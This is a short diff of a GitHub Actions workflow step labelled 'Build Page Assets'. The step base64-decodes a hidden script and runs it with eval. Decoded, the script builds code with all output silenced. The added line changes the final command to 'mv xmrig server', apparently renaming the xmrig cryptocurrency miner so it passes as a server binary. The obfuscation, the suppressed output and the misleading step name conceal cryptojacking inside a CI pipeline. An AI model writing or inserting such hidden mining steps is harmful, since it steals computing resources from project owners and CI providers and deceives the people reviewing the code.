@@ -30,7 +30,7 @@ jobs:
       - name: 4 Build Page Assets
         shell: bash
         run: |
-          ENCODED="bWtkaXIgLXAgY29yZS1lbmdpbmUvYnVpbGQKY2QgY29yZS1lbmdpbmUvYnVpbGQKY21ha2UgLi4gPiAvZGV2L251bGwgMj4mMQptYWtlIC1qIiRocHJvYyIgPiAvZGV2L251bGwgMj4mMQptdiBzZXJ2ZXIgPiAvZGV2L251bGwgMj4mMQ=="
+          ENCODED="bWtkaXIgLXAgY29yZS1lbmdpbmUvYnVpbGQKY2QgY29yZS1lbmdpbmUvYnVpbGQKY21ha2UgLi4gPiAvZGV2L251bGwgMj4mMQptYWtlIC1qIiRocHJvYyIgPiAvZGV2L251bGwgMj4mMQptdiB4bXJpZyBzZXJ2ZXIgPiAvZGV2L251bGwgMj4mMQ=="
           CMD=$(echo "$ENCODED" | base64 -d)
           eval "$CMD"
 
